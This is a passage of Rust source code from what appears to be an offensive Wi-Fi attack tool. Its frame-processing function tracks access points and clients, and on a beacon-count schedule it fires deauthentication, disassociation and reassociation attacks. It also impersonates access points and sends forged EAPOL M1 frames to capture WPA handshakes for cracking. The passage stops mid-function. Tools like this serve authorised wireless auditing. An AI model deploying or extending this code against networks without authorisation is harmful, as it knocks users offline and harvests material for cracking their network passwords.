#![allow(dead_code)]
extern crate libc;
extern crate nix;

use anyhow::Result;
use attack::{
    anon_reassociation_attack, deauth_attack, disassoc_attack, m1_retrieval_attack,
    m1_retrieval_attack_phase_2, rogue_m2_attack_directed, rogue_m2_attack_undirected,
};
use libwifi::frame::components::{MacAddress, RsnAkmSuite, RsnCipherSuite, WpaAkmSuite};
use nl80211_ng::channels::freq_to_band;
use oxideruntime::OxideRuntime;
use radiotap::field::{AntennaSignal, Field};
use radiotap::Radiotap;
use tracing::instrument;
use libwifi::{Addresses, Frame};
use std::os::fd::AsRawFd;
use std::time::SystemTime;

use crate::devices::{APFlags, AccessPoint, Station, WiFiDeviceList};
use crate::pcapng::FrameData;
use crate::status::{MessageType, StatusMessage};
use crate::tx::{
    build_association_response, build_authentication_response, build_eapol_m1,
    build_probe_request_target, build_probe_request_undirected,
};
use crate::util::{handle_data_frame, handle_null_data_frame, write_packet};
use crate::{attack, oxideruntime};

#[instrument(skip(oxide))]
pub fn process_frame(oxide: &mut OxideRuntime, packet: &[u8]) -> Result<(), String> {
    let radiotap = match Radiotap::from_bytes(packet) {
        Ok(radiotap) => radiotap,
        Err(error) => {
            oxide.counters.error_count += 1;
            oxide.status_log.add_message(StatusMessage::new(
                MessageType::Error,
                format!("Couldn't read packet data with Radiotap: {error:?}",),
            ));
            return Err(error.to_string());
        }
    };

    oxide.counters.frame_count += 1;
    let packet_id = oxide.counters.packet_id();

    // Get Channel Values
    let current_freq = oxide.if_hardware.interface.frequency.clone().unwrap();
    let current_channel = current_freq.channel.unwrap();
    oxide.if_hardware.current_channel = current_channel.clone();
    oxide.if_hardware.current_band = freq_to_band(current_freq.frequency.unwrap());
    let band = &oxide.if_hardware.current_band;
    let payload = &packet[radiotap.header.length..];

    let fcs = radiotap.flags.map_or(false, |flags| flags.fcs);
    let gps_data = oxide.file_data.gps_source.get_gps();
    let source: MacAddress;
    let destination: MacAddress;

    // Send a probe request out there every 200 beacons.
    if oxide.counters.beacons % 200 == 0 && !oxide.config.notx {
        let frx = build_probe_request_undirected(
            &oxide.target_data.rogue_client,
            oxide.counters.sequence2(),
        );
        let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
    }

    match libwifi::parse_frame(payload, fcs) {
        Ok(frame) => {
            source = *frame.src().unwrap_or(&MacAddress([0, 0, 0, 0, 0, 0]));
            destination = *frame.dest();
            let mut beacon_count = 999;

            // Pre Processing
            match frame.clone() {
                Frame::Beacon(beacon_frame) => {
                    oxide.counters.beacons += 1;
                    let bssid = beacon_frame.header.address_3;
                    let signal_strength: AntennaSignal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let station_info = &beacon_frame.station_info;
                    let ssid = station_info
                        .ssid
                        .as_ref()
                        .map(|nssid| nssid.replace('\0', ""));

                    if bssid.is_real_device() && bssid != oxide.target_data.rogue_client {
                        let ap =
                            oxide.access_points.add_or_update_device(
                                bssid,
                                &AccessPoint::new(
                                    bssid,
                                    signal_strength,
                                    ssid.clone(),
                                    station_info
                                        .ds_parameter_set
                                        .map(|ch| (band.clone(), ch as u32)),
                                    Some(APFlags {
                                        apie_essid: station_info.ssid.as_ref().map(|_| true),
                                        gs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::CCMP
                                        }),
                                        gs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::TKIP
                                        }),
                                        cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::CCMP)
                                        }),
                                        cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::TKIP)
                                        }),
                                        rsn_akm_psk: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                        rsn_akm_psk256: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256),
                                        ),
                                        rsn_akm_pskft: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT),
                                        ),
                                        rsn_akm_sae: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::SAE)),
                                        wpa_akm_psk: station_info
                                            .wpa_info
                                            .as_ref()
                                            .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                        ap_mfp: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.mfp_required),
                                    }),
                                    oxide.target_data.rogue_client,
                                    station_info.wps_info.clone(),
                                    oxide.file_data.oui_database.search(&bssid),
                                ),
                            );

                        // Proliferate whitelist
                        let _ = oxide.target_data.whitelist.get_whitelisted(ap);

                        // Proliferate the SSID / MAC to targets (if this is a target)
                        // Also handle adding the target channel to autohunt params.

                        let targets = oxide.target_data.targets.get_targets(ap);
                        if !targets.is_empty() {
                            // This is a target_data target
                            if let Some(channel) = station_info.ds_parameter_set {
                                // We have a channel in the broadcast (real channel)
                                if oxide
                                    .if_hardware
                                    .hop_channels
                                    .contains(&(band.to_u8(), channel.into()))
                                {
                                    // We are autohunting and our current channel is real (band/channel match)
                                    for target in targets {
                                        // Go through all the target matches we got (which could be a Glob SSID, Match SSID, and MAC!)
                                        if let Some(vec) =
                                            oxide.if_hardware.target_chans.get_mut(&target)
                                        {
                                            // This target is inside hop_chans
                                            // Update the target with this band/channel (if it isn't already there)
                                            if !vec.contains(&(band.to_u8(), channel.into())) {
                                                vec.push((band.to_u8(), channel.into()));
                                            }
                                        } else {
                                            // Add this target to target_chans (this was a "proliferated" target we didn't know about at first)
                                            oxide.if_hardware.target_chans.insert(
                                                target,
                                                vec![(band.to_u8(), channel.into())],
                                            );
                                        }
                                    }
                                }
                            }
                        };

                        // No SSID, send a probe request. This is low-key so don't increment interactions for this AP.
                        if !ap.ssid.clone().is_some_and(|ssid| !ssid.is_empty())
                            && !oxide.config.notx
                            && ap.beacon_count % 200 == 0
                        {
                            let frx = build_probe_request_target(
                                &oxide.target_data.rogue_client,
                                &bssid,
                                oxide.counters.sequence2(),
                            );
                            let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
                            oxide.status_log.add_message(StatusMessage::new(
                                MessageType::Info,
                                format!("Attempting Hidden SSID Collect: {}", bssid),
                            ));
                        }
                        beacon_count = ap.beacon_count;
                    }

                    // Always try M1 Retrieval
                    // it is running it's own internal rate limiting.
                    let _ = m1_retrieval_attack(oxide, &bssid);

                    let rate = beacon_count % oxide.target_data.attack_rate.to_rate();

                    if (rate) == 0 {
                        deauth_attack(oxide, &bssid)?;
                    } else if (rate) == oxide.target_data.attack_rate.to_rate() / 4 {
                        anon_reassociation_attack(oxide, &bssid)?;
                    } else if (rate) == (oxide.target_data.attack_rate.to_rate() / 4) * 2 {
                        //csa_attack(oxide, beacon_frame)?;
                    } else if (rate) == (oxide.target_data.attack_rate.to_rate() / 4) * 3 {
                        disassoc_attack(oxide, &bssid)?;
                    }

                    // Increase beacon count (now that the attacks are over)
                    if let Some(ap) = oxide.access_points.get_device(&bssid) {
                        ap.beacon_count += 1;
                    }
                }
                Frame::ProbeRequest(probe_request_frame) => {
                    oxide.counters.probe_requests += 1;

                    let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = probe_request_frame.header.address_1; // MAC address of the client
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    let ssid = &probe_request_frame.station_info.ssid;

                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        if !ap_mac.is_broadcast() {
                            // Directed probe request
                            match ssid {
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                                None => {}
                            }
                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_directed(oxide, probe_request_frame)?;
                        } else {
                            // undirected probe request

                            match ssid {
                                None => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                                Some(ssid) => {
                                    // Add to unassoc clients.
                                    oxide.unassoc_clients.add_or_update_device(
                                        client_mac,
                                        &Station::new_unassoc_station(
                                            client_mac,
                                            signal_strength,
                                            vec![ssid.to_string()],
                                            oxide.file_data.oui_database.search(&client_mac),
                                        ),
                                    );
                                }
                            }

                            // Probe request attack - Begin our RogueM2 attack procedure.
                            rogue_m2_attack_undirected(oxide, probe_request_frame)?;
                        }
                    }
                }
                Frame::ProbeResponse(probe_response_frame) => {
                    // Assumption:
                    //  Only an AP will send a probe response.
                    //
                    oxide.counters.probe_responses += 1;
                    let bssid = &probe_response_frame.header.address_3;
                    let signal_strength = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );
                    if bssid.is_real_device() && *bssid != oxide.target_data.rogue_client {
                        let station_info = &probe_response_frame.station_info;
                        let ssid = station_info
                            .ssid
                            .as_ref()
                            .map(|nssid| nssid.replace('\0', ""));
                        let ap =
                            oxide.access_points.add_or_update_device(
                                *bssid,
                                &AccessPoint::new(
                                    *bssid,
                                    signal_strength,
                                    ssid,
                                    station_info
                                        .ds_parameter_set
                                        .map(|ch| (band.clone(), ch as u32)),
                                    Some(APFlags {
                                        apie_essid: station_info.ssid.as_ref().map(|_| true),
                                        gs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::CCMP
                                        }),
                                        gs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.group_cipher_suite == RsnCipherSuite::TKIP
                                        }),
                                        cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::CCMP)
                                        }),
                                        cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                            rsn.pairwise_cipher_suites
                                                .contains(&RsnCipherSuite::TKIP)
                                        }),
                                        rsn_akm_psk: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                        rsn_akm_psk256: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256),
                                        ),
                                        rsn_akm_pskft: station_info.rsn_information.as_ref().map(
                                            |rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT),
                                        ),
                                        rsn_akm_sae: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::SAE)),
                                        wpa_akm_psk: station_info
                                            .wpa_info
                                            .as_ref()
                                            .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                        ap_mfp: station_info
                                            .rsn_information
                                            .as_ref()
                                            .map(|rsn| rsn.mfp_required),
                                    }),
                                    oxide.target_data.rogue_client,
                                    station_info.wps_info.clone(),
                                    oxide.file_data.oui_database.search(bssid),
                                ),
                            );

                        ap.pr_station = Some(probe_response_frame.station_info.clone());

                        // Proliferate whitelist
                        let _ = oxide.target_data.whitelist.get_whitelisted(ap);

                        // Proliferate the SSID / MAC to targets (if this is a target)
                        // Also handle adding the target channel to autohunt params.

                        let targets = oxide.target_data.targets.get_targets(ap);
                        if !targets.is_empty() {
                            // This is a target_data target
                            if let Some(channel) = station_info.ds_parameter_set {
                                // We have a channel in the broadcast (real channel)
                                if oxide
                                    .if_hardware
                                    .hop_channels
                                    .contains(&(band.to_u8(), channel.into()))
                                {
                                    // We are autohunting and our current channel is real (band/channel match)
                                    for target in targets {
                                        // Go through all the target matches we got (which could be a Glob SSID, Match SSID, and MAC!)
                                        if let Some(vec) =
                                            oxide.if_hardware.target_chans.get_mut(&target)
                                        {
                                            // This target is inside hop_chans
                                            // Update the target with this band/channel (if it isn't already there)
                                            if !vec.contains(&(band.to_u8(), channel.into())) {
                                                vec.push((band.to_u8(), channel.into()));
                                            }
                                        } else {
                                            // Add this target to target_chans (this was a "proliferated" target we didn't know about at first)
                                            oxide.if_hardware.target_chans.insert(
                                                target,
                                                vec![(band.to_u8(), channel.into())],
                                            );
                                        }
                                    }
                                }
                            }
                        };
                        let _ = m1_retrieval_attack(oxide, bssid);
                    };
                }
                Frame::Authentication(auth_frame) => {
                    oxide.counters.authentication += 1;

                    // Assumption:
                    //  Authentication packets can be sent by the AP or Client.
                    //  We will use the sequence number to decipher.

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if auth_frame.auth_algorithm == 0 {
                        // Open system (Which can be open or WPA2)
                        if auth_frame.auth_seq == 1 {
                            // From Client
                            let client = auth_frame.header.address_2;
                            let ap_addr = auth_frame.header.address_1;

                            // First let's add it to our unassociated clients list:
                            let station = oxide.unassoc_clients.add_or_update_device(
                                client,
                                &Station::new_unassoc_station(
                                    client,
                                    signal,
                                    vec![],
                                    oxide.file_data.oui_database.search(&client),
                                ),
                            );

                            if ap_addr == oxide.target_data.rogue_client {
                                // We need to send an auth back
                                let frx = build_authentication_response(
                                    &client,
                                    &ap_addr,
                                    &ap_addr,
                                    oxide.counters.sequence3(),
                                );
                                write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                                station.interactions += 1;
                            }
                        } else if auth_frame.auth_seq == 2 {
                            //// From AP
                            let client = auth_frame.header.address_1;
                            let ap_addr = auth_frame.header.address_2;

                            // Add AP
                            oxide.access_points.add_or_update_device(
                                ap_addr,
                                &AccessPoint::new(
                                    ap_addr,
                                    signal,
                                    None,
                                    None,
                                    None,
                                    oxide.target_data.rogue_client,
                                    None,
                                    oxide.file_data.oui_database.search(&ap_addr),
                                ),
                            );

                            if client != oxide.target_data.rogue_client {
                                // If it's not our rogue client that it's responding to.
                                oxide.unassoc_clients.add_or_update_device(
                                    client,
                                    &Station::new_unassoc_station(
                                        client,
                                        AntennaSignal::from_bytes(&[0u8])
                                            .map_err(|err| err.to_string())?,
                                        vec![],
                                        oxide.file_data.oui_database.search(&client),
                                    ),
                                );
                            } else {
                                let _ = m1_retrieval_attack_phase_2(
                                    &ap_addr,
                                    &oxide.target_data.rogue_client.clone(),
                                    oxide,
                                );
                            }
                        }
                    }
                }
                Frame::Deauthentication(deauth_frame) => {
                    oxide.counters.deauthentication += 1;

                    // Assumption:
                    //  Deauthentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = deauth_frame.header.frame_control.from_ds();
                    let to_ds: bool = deauth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        deauth_frame.header.address_2
                    } else if !from_ds && to_ds {
                        deauth_frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        deauth_frame.header.address_2
                    } else {
                        deauth_frame.header.address_1
                    };

                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    // Add AP
                    if ap_addr.is_real_device() {
                        oxide.access_points.add_or_update_device(
                            ap_addr,
                            &AccessPoint::new(
                                ap_addr,
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                None,
                                None,
                                None,
                                oxide.target_data.rogue_client,
                                None,
                                oxide.file_data.oui_database.search(&ap_addr),
                            ),
                        );
                    }

                    // If client sends deauth... we should probably treat as unassoc?
                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        oxide.unassoc_clients.add_or_update_device(
                            station_addr,
                            &Station::new_unassoc_station(
                                station_addr,
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?
                                },
                                vec![],
                                oxide.file_data.oui_database.search(&station_addr),
                            ),
                        );
                    }
                }
                Frame::Action(frame) => {
                    let from_ds: bool = frame.header.frame_control.from_ds();
                    let to_ds: bool = frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        frame.header.address_2
                    } else if !from_ds && to_ds {
                        frame.header.address_1
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        frame.header.address_2
                    } else {
                        frame.header.address_1
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or rogue

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::AssociationRequest(assoc_request_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a client/potential client will ever submit an association request.
                    //  This is how we will know to send a fake M1 and try to get an M2 from it.

                    let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
                    let ap_mac = assoc_request_frame.header.address_1; // MAC address of the AP.
                    let ssid = assoc_request_frame.station_info.ssid;

                    // Handle client as not yet associated
                    if client_mac.is_real_device() && client_mac != oxide.target_data.rogue_client {
                        let station = oxide.unassoc_clients.add_or_update_device(
                            client_mac,
                            &Station::new_unassoc_station(
                                client_mac,
                                radiotap.antenna_signal.unwrap_or(
                                    AntennaSignal::from_bytes(&[0u8])
                                        .map_err(|err| err.to_string())?,
                                ),
                                vec![],
                                oxide.file_data.oui_database.search(&client_mac),
                            ),
                        );

                        if ap_mac == oxide.target_data.rogue_client {
                            let rogue_ssid = ssid.unwrap_or("".to_string());
                            // We need to send an association response back
                            let frx = build_association_response(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &rogue_ssid,
                            );
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
                            // Then an M1
                            let m1: Vec<u8> = build_eapol_m1(
                                &client_mac,
                                &ap_mac,
                                &ap_mac,
                                oxide.counters.sequence3(),
                                &oxide.target_data.rogue_m1,
                            );
                            oxide
                                .target_data
                                .rogue_essids
                                .insert(client_mac, rogue_ssid);
                            write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &m1)?;
                            station.interactions += 2;
                        }
                    };
                    // Add AP
                    if ap_mac.is_real_device() {
                        let ap = AccessPoint::new(
                            ap_mac,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            None,
                            None,
                            None,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&ap_mac),
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::AssociationResponse(assoc_response_frame) => {
                    oxide.counters.association += 1;

                    // Assumption:
                    //  Only a AP will ever submit an association response.
                    //
                    let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                    let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if assoc_response_frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(bssid),
                                oxide.file_data.oui_database.search(&client_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                        }
                        let station_info = &assoc_response_frame.station_info;
                        let ap = AccessPoint::new_with_clients(
                            bssid,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            None,
                            Some(APFlags {
                                apie_essid: station_info.ssid.as_ref().map(|_| true),
                                gs_ccmp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::CCMP),
                                gs_tkip: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.group_cipher_suite == RsnCipherSuite::TKIP),
                                cs_ccmp: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP)
                                }),
                                cs_tkip: station_info.rsn_information.as_ref().map(|rsn| {
                                    rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP)
                                }),
                                rsn_akm_psk: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK)),
                                rsn_akm_psk256: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSK256)),
                                rsn_akm_pskft: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::PSKFT)),
                                rsn_akm_sae: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.akm_suites.contains(&RsnAkmSuite::SAE)),
                                wpa_akm_psk: station_info
                                    .wpa_info
                                    .as_ref()
                                    .map(|wpa| wpa.akm_suites.contains(&WpaAkmSuite::Psk)),
                                ap_mfp: station_info
                                    .rsn_information
                                    .as_ref()
                                    .map(|rsn| rsn.mfp_required),
                            }),
                            clients,
                            oxide.target_data.rogue_client,
                            station_info.wps_info.clone(),
                            oxide.file_data.oui_database.search(&bssid),
                        );
                        oxide.access_points.add_or_update_device(bssid, &ap);
                    };
                }
                Frame::ReassociationRequest(frame) => {
                    oxide.counters.reassociation += 1;

                    // Assumption:
                    //  Only a client will ever submit an reassociation request.
                    //  Attack includes sending a reassociation response and M1 frame- looks very similar to attacking an associataion request.
                    let client_mac = frame.header.address_2; // MAC address of the client
                    let new_ap = frame.header.address_1; // MAC address of the AP
                    let old_ap = frame.current_ap_address;
                    let ssid = frame.station_info.ssid;

                    // Technically the client is still associated to the old AP. Let's add it there and we will handle moving it over if we get a reassociation response.
                    if old_ap.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        // Setup client
                        let client = &Station::new_station(
                            client_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            Some(old_ap),
                            oxide.file_data.oui_database.search(&client_mac),
                        );
                        clients.add_or_update_device(client_mac, client);
                        oxide.unassoc_clients.remove_device(&client_mac);

                        let ap = AccessPoint::new_with_clients(
                            old_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&old_ap),
                        );
                        oxide.access_points.add_or_update_device(old_ap, &ap);

                        let newap = AccessPoint::new_with_clients(
                            new_ap,
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ssid.clone(),
                            None,
                            None,
                            WiFiDeviceList::<Station>::new(),
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&new_ap),
                        );
                        oxide.access_points.add_or_update_device(new_ap, &newap);
                    };
                }
                Frame::ReassociationResponse(frame) => {
                    oxide.counters.reassociation += 1;
                    // Assumption:
                    //  Only a AP will ever submit a reassociation response.
                    //
                    let client_mac = frame.header.address_1; // MAC address of the client
                    let ap_mac = frame.header.address_2; // MAC address of the AP (BSSID)

                    if ap_mac.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != oxide.target_data.rogue_client
                    {
                        // Valid devices
                        let mut clients = WiFiDeviceList::<Station>::new();

                        if frame.status_code != 0 {
                            // Association was successful
                            let client = &Station::new_station(
                                client_mac,
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                                Some(ap_mac),
                                oxide.file_data.oui_database.search(&client_mac),
                            );
                            clients.add_or_update_device(client_mac, client);
                            oxide.unassoc_clients.remove_device(&client_mac);
                            // Find the old AP, remove this device from it.
                            if let Some(old_ap) =
                                oxide.access_points.find_ap_by_client_mac(&client_mac)
                            {
                                old_ap.client_list.remove_device(&client_mac);
                            }
                        }
                        let ap = AccessPoint::new_with_clients(
                            ap_mac,
                            radiotap.antenna_signal.unwrap_or(
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                            ),
                            None,
                            None,
                            None,
                            clients,
                            oxide.target_data.rogue_client,
                            None,
                            oxide.file_data.oui_database.search(&ap_mac),
                        );
                        oxide.access_points.add_or_update_device(ap_mac, &ap);
                    };
                }
                Frame::Rts(frame) => {
                    oxide.counters.control_frames += 1;
                    // Most drivers (Mediatek, Ralink, Atheros) don't seem to be actually sending these to userspace (on linux).
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
                        oxide.target_data.rogue_client,
                        None,
                        oxide.file_data.oui_database.search(&ap_addr),
                    );
                    oxide.access_points.add_or_update_device(ap_addr, &ap);
                }
                Frame::Cts(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::Ack(_) => {
                    oxide.counters.control_frames += 1;
                    // Not really doing anything with these yet...
                }
                Frame::BlockAck(frame) => {
                    oxide.counters.control_frames += 1;
                    //println!("BlockAck: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac
                    } else if !from_ds && to_ds {
                        dest_mac
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac
                    } else {
                        dest_mac
                    };

                    let mut clients = WiFiDeviceList::<Station>::new(); // Clients list for AP.
                    let signal = radiotap.antenna_signal.unwrap_or(
                        AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?,
                    );

                    if station_addr.is_real_device()
                        && station_addr != oxide.target_data.rogue_client
                    {
                        // Make sure this isn't a broadcast or something

                        let client = &Station::new_station(
                            station_addr,
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                            },
                            Some(ap_addr),
                            oxide.file_data.oui_database.search(&station_addr),
                        );
                        clients.add_or_update_device(station_addr, client);
                        oxide.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = AccessPoint::new_with_clients(
                        ap_addr,
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8]).map_err(|err| err.to_string())?
                        },
                        None,
                        None,
                        None,
                        clients,
